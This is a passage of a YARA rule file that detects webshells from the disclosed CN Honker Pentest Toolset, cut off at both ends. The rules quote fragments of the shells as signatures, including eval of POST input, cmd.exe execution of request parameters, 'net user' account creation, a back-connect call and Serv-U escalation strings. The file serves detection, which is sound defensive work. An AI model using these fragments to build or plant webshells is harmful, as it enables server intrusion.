      description = "Webshell from CN Honker Pentest Toolset - file sniff.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:48:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "IPHostEntry HosyEntry = Dns.GetHostEntry((Dns.GetHostName()));" fullword ascii
      $s2 = "if (!logIt && my_s_smtp && (dport == 25 || sport == 25))" fullword ascii
   condition: 
      filesize < 91KB and all of them
}

rule CN_Honker_Webshell_udf_udf_RID3139 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file udf.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:13:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<?php // Source  My : Meiam  " fullword ascii
      $s2 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii
   condition: 
      filesize < 430KB and all of them
}

rule CN_Honker_Webshell_JSP_jsp_RID30F5 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file jsp.html"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:02:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<input name=f size=30 value=shell.jsp>" fullword ascii
      $s2 = "<font color=red>www.i0day.com  By:" fullword ascii
   condition: 
      filesize < 3KB and all of them
}

rule CN_Honker_Webshell_T00ls_Lpk_Sethc_v4_mail_RID36D6 : CHINA DEMO T1505_003 T1546_008 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file mail.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 17:12:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, T1546_008, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if (!$this->smtp_putcmd(\"AUTH LOGIN\", base64_encode($this->user)))" fullword ascii
      $s2 = "$this->smtp_debug(\"> \".$cmd.\"\\n\");" fullword ascii
   condition: 
      filesize < 39KB and all of them
}

rule CN_Honker_Webshell_phpwebbackup_RID3358 : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file phpwebbackup.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:43:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php // Code By isosky www.nbst.org" fullword ascii
      $s2 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii
   condition: 
      uint16 ( 0 ) == 0x3f3c and filesize < 67KB and all of them
}

rule CN_Honker_Webshell_dz_phpcms_phpbb_RID348F : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file dz_phpcms_phpbb.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:35:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if($pwd == md5(md5($password).$salt))" fullword ascii
      $s2 = "function test_1($password)" fullword ascii
      $s3 = ":\".$pwd.\"\\n---------------------------------\\n\";exit;" fullword ascii
      $s4 = ":user=\".$user.\"\\n\";echo \"pwd=\".$pwd.\"\\n\";echo \"salt=\".$salt.\"\\n\";" fullword ascii
   condition: 
      filesize < 22KB and all of them
}

rule CN_Honker_Webshell_picloaked_1_RID3298 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file 1.gif"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:11:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php eval($_POST[" ascii
      $s1 = ";<%execute(request(" ascii
      $s3 = "GIF89a" fullword ascii
   condition: 
      filesize < 6KB and 2 of them
}

rule CN_Honker_Webshell_assembly_RID31BC : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file assembly.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:35:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "response.write oScriptlhn.exec(\"cmd.exe /c\" & request(\"c\")).stdout.readall" fullword ascii
   condition: 
      filesize < 1KB and all of them
}

rule CN_Honker_Webshell_PHP_php8_RID3123 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php8.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:09:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<a href=\"http://hi.baidu.com/ca3tie1/home\" target=\"_blank\">Ca3tie1's Blog</a" ascii
      $s1 = "function startfile($path = 'dodo.zip')" fullword ascii
      $s3 = "<form name=\"myform\" method=\"post\" action=\"\">" fullword ascii
      $s5 = "$_REQUEST[zipname] = \"dodozip.zip\"; " fullword ascii
   condition: 
      filesize < 25KB and 2 of them
}

rule CN_Honker_Webshell_Tuoku_script_xx_RID34B7 : CHINA DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file xx.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:42:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$mysql.=\"insert into `$table`($keys) values($vals);\\r\\n\";" fullword ascii
      $s2 = "$mysql_link=@mysql_connect($mysql_servername , $mysql_username , $mysql_password" ascii
      $s16 = "mysql_query(\"SET NAMES gbk\");" fullword ascii
   condition: 
      filesize < 2KB and all of them
}

rule CN_Honker_Webshell_JSPMSSQL_RID30D9 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file JSPMSSQL.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 12:57:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<form action=\"?action=operator&cmd=execute\"" fullword ascii
      $s2 = "String sql = request.getParameter(\"sqlcmd\");" fullword ascii
   condition: 
      filesize < 35KB and all of them
}

rule CN_Honker_Webshell_Injection_Transit_jmPost_RID381F : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file jmPost.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 18:07:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "response.write  PostData(JMUrl,JmStr,JmCok,JmRef)" fullword ascii
      $s2 = "JmdcwName=request(\"jmdcw\")" fullword ascii
   condition: 
      filesize < 9KB and all of them
}

rule CN_Honker_Webshell_ASP_web_asp_RID3280 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file web.asp.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:07:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<FORM method=post target=_blank>ShellUrl: <INPUT " fullword ascii
      $s1 = "\" >[Copy code]</a> 4ngr7&nbsp; &nbsp;</td>" fullword ascii
   condition: 
      filesize < 13KB and all of them
}

rule CN_Honker_Webshell_wshell_asp_RID328E : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file wshell-asp.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:10:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "file1.Write(\"<%response.clear:execute request(\\\"root\\\"):response.End%>\");" fullword ascii
      $s2 = "hello word !  " fullword ascii
      $s3 = "root.asp " fullword ascii
   condition: 
      filesize < 5KB and all of them
}

rule CN_Honker_Webshell_ASP_asp404_RID317B : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file asp404.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:24:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "temp1 = Len(folderspec) - Len(server.MapPath(\"./\")) -1" fullword ascii
      $s1 = "<form name=\"form1\" method=\"post\" action=\"<%= url%>?action=chklogin\">" fullword ascii
      $s2 = "<td>&nbsp;<a href=\"<%=tempurl+f1.name%>\" target=\"_blank\"><%=f1.name%></a></t" ascii
   condition: 
      filesize < 113KB and all of them
}

rule CN_Honker_Webshell_Serv_U_asp_RID3253 : CHINA DEMO T1087_002 T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file Serv-U asp.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:00:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1087_002, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" &" ascii
      $s2 = "<td><input name=\"c\" type=\"text\" id=\"c\" value=\"cmd /c net user goldsun lov" ascii
      $s3 = "deldomain = \"-DELETEDOMAIN\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \" PortNo=\"" ascii
   condition: 
      filesize < 30KB and 2 of them
}

rule CN_Honker_Webshell_cfm_list_RID31AD : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file list.cfm"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:32:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<TD><a href=\"javascript:ShowFile('#mydirectory.name#')\">#mydirectory.name#</a>" ascii
      $s2 = "<TD>#mydirectory.size#</TD>" fullword ascii
   condition: 
      filesize < 10KB and all of them
}

rule CN_Honker_Webshell_PHP_php2_RID311D : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php2.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:08:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$OOO0O0O00=__FILE__;$OOO000000=urldecode('" ascii
      $s2 = "<?php // Black" fullword ascii
   condition: 
      filesize < 12KB and all of them
}

rule CN_Honker_Webshell_Tuoku_script_oracle_RID363D : CHINA DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file oracle.jsp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 16:47:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword ascii
      $s2 = "String user=\"oracle_admin\";" fullword ascii
      $s3 = "String sql=\"SELECT 1,2,3,4,5,6,7,8,9,10 from user_info\";" fullword ascii
   condition: 
      filesize < 7KB and all of them
}

rule CN_Honker_Webshell_ASPX_aspx4_RID31E7 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file aspx4.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:42:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "File.Delete(cdir.FullName + \"\\\\test\");" fullword ascii
      $s5 = "start<asp:TextBox ID=\"Fport_TextBox\" runat=\"server\" Text=\"c:\\\" Width=\"60" ascii
      $s6 = "<div>Code By <a href =\"http://www.hkmjj.com\">Www.hkmjj.Com</a></div>" fullword ascii
   condition: 
      filesize < 11KB and all of them
}

rule CN_Honker_Webshell_ASPX_aspx_RID31B3 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file aspx.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:33:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin" ascii
      $s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
      $s2 = "td.Text=\"<a href=\\\"javascript:Bin_PostBack('urJG','\"+dt.Rows[j][\"ProcessID" ascii
      $s3 = "vyX.Text+=\"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\"+MVVJ(rootkey)+" ascii
   condition: 
      filesize < 353KB and 2 of them
}

rule CN_Honker_Webshell_su7_x_9_x_RID31C1 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file su7.x-9.x.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:36:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "returns=httpopen(\"LoginID=\"&user&\"&FullName=&Password=\"&pass&\"&ComboPasswor" ascii
      $s1 = "returns=httpopen(\"\",\"POST\",\"http://127.0.0.1:\"&port&\"/Admin/XML/User.xml?" ascii
   condition: 
      filesize < 59KB and all of them
}

rule CN_Honker_Webshell_cfmShell_RID318A : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file cfmShell.cfm"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:26:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<cfexecute name=\"C:\\Winnt\\System32\\cmd.exe\"" fullword ascii
      $s4 = "<cfif FileExists(\"#GetTempDirectory()#foobar.txt\") is \"Yes\">" fullword ascii
   condition: 
      filesize < 4KB and all of them
}

rule CN_Honker_Webshell_ASP_asp4_RID3117 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file asp4.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:07:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii
      $s6 = "Response.Cookies(Cookie_Login) = sPwd" fullword ascii
      $s8 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
   condition: 
      filesize < 150KB and all of them
}

rule CN_Honker_Webshell_Serv_U_2_admin_by_lake2_RID3711 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file Serv-U 2 admin by lake2.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 17:22:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "xPost3.Open \"POST\", \"http://127.0.0.1:\"& port &\"/lake2\", True" fullword ascii
      $s2 = "response.write \"FTP user lake  pass admin123 :)<br><BR>\"" fullword ascii
      $s8 = "<p>Serv-U Local Get SYSTEM Shell with ASP" fullword ascii
      $s9 = "\"-HomeDir=c:\\\\\" & vbcrlf & \"-LoginMesFile=\" & vbcrlf & \"-Disable=0\" & vb" ascii
   condition: 
      filesize < 17KB and 2 of them
}

rule CN_Honker_Webshell_PHP_php3_RID311E : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php3.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:08:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "} elseif(@is_resource($f = @popen($cfe,\"r\"))) {" fullword ascii
      $s2 = "cf('/tmp/.bc',$back_connect);" fullword ascii
   condition: 
      filesize < 8KB and all of them
}

rule CN_Honker_Webshell_Serv_U_by_Goldsun_RID3525 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file Serv-U_by_Goldsun.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 16:00:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/goldsun/upadmin/s2\", True," ascii
      $s2 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" &" ascii
      $s3 = "127.0.0.1:<%=port%>," fullword ascii
      $s4 = "GName=\"http://\" & request.servervariables(\"server_name\")&\":\"&request.serve" ascii
   condition: 
      filesize < 30KB and 2 of them
}

rule CN_Honker_Webshell_PHP_php10_RID314C : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php10.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:16:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "dumpTable($N,$M,$Hc=false){if($_POST[\"format\"]!=\"sql\"){echo\"\\xef\\xbb\\xbf" ascii
      $s2 = "';if(DB==\"\"||!$od){echo\"<a href='\".h(ME).\"sql='\".bold(isset($_GET[\"sql\"]" ascii
   condition: 
      filesize < 600KB and all of them
}

rule CN_Honker_Webshell_Serv_U_servu_RID3344 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file servu.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:40:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "fputs ($conn_id, \"SITE EXEC \".$dir.\"cmd.exe /c \".$cmd.\"\\r\\n\");" fullword ascii
      $s1 = "function ftpcmd($ftpport,$user,$password,$dir,$cmd){" fullword ascii
   condition: 
      filesize < 41KB and all of them
}

rule CN_Honker_Webshell_portRecall_jsp2_RID3452 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file jsp2.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:25:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "final String remoteIP =request.getParameter(\"remoteIP\");" fullword ascii
      $s4 = "final String localIP = request.getParameter(\"localIP\");" fullword ascii
      $s20 = "final String localPort = \"3390\";//request.getParameter(\"localPort\");" fullword ascii
   condition: 
      filesize < 23KB and all of them
}

rule CN_Honker_Webshell_ASPX_aspx2_RID31E5 : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file aspx2.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:42:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if (password.Equals(this.txtPass.Text))" fullword ascii
      $s1 = "<head runat=\"server\">" fullword ascii
      $s2 = ":<asp:TextBox runat=\"server\" ID=\"txtPass\" Width=\"400px\"></asp:TextBox>" fullword ascii
      $s3 = "this.lblthispath.Text = Server.MapPath(Request.ServerVariables[\"PATH_INFO\"]);" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 9KB and all of them
}

rule CN_Honker_Webshell_ASP_hy2006a_RID31A9 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file hy2006a.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:32:01"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s15 = "Const myCmdDotExeFile = \"command.com\"" fullword ascii
      $s16 = "If LCase(appName) = \"cmd.exe\" And appArgs <> \"\" Then" fullword ascii
   condition: 
      filesize < 406KB and all of them
}

rule CN_Honker_Webshell_PHP_php1_RID311C : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php1.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:08:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "$sendbuf = \"site exec \".$_POST[\"SUCommand\"].\"\\r\\n\";" fullword ascii
      $s8 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_c" ascii
      $s18 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport" ascii
   condition: 
      filesize < 621KB and all of them
}

rule CN_Honker_Webshell_jspshell2_RID31F3 : CHINA DEMO T1007 T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file jspshell2.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:44:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1007, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s10 = "if (cmd == null) cmd = \"cmd.exe /c set\";" fullword ascii
      $s11 = "if (program == null) program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt" ascii
   condition: 
      filesize < 424KB and all of them
}

rule CN_Honker_Webshell_Tuoku_script_mysql_RID35FD : CHINA DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file mysql.aspx"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 16:36:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "txtpassword.Attributes.Add(\"onkeydown\", \"SubmitKeyClick('btnLogin');\");" fullword ascii
      $s2 = "connString = string.Format(\"Host = {0}; UserName = {1}; Password = {2}; Databas" ascii
   condition: 
      filesize < 202KB and all of them
}

rule CN_Honker_Webshell_PHP_php9_RID3124 : CHINA DEMO T1087_002 T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php9.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:09:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1087_002, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Str[17] = \"select shell('c:\\windows\\system32\\cmd.exe /c net user b4che10r ab" ascii
   condition: 
      filesize < 1087KB and all of them
}

rule CN_Honker_Webshell_portRecall_jsp_RID3420 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file jsp.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:17:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "lcx.jsp?localIP=202.91.246.59&localPort=88&remoteIP=218.232.111.187&remotePort=2" ascii
   condition: 
      filesize < 1KB and all of them
}

rule CN_Honker_Webshell_ASPX_aspx3_RID31E6 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file aspx3.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:42:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Process p1 = Process.Start(\"\\\"\" + txtRarPath.Value + \"\\\"\", \" a -y -k -m" ascii
      $s12 = "if (_Debug) System.Console.WriteLine(\"\\ninserting filename into CDS:" ascii
   condition: 
      filesize < 100KB and all of them
}

rule CN_Honker_Webshell_ASPX_shell_shell_RID3486 : CHINA DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file shell.aspx"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:34:11"
      score = 70
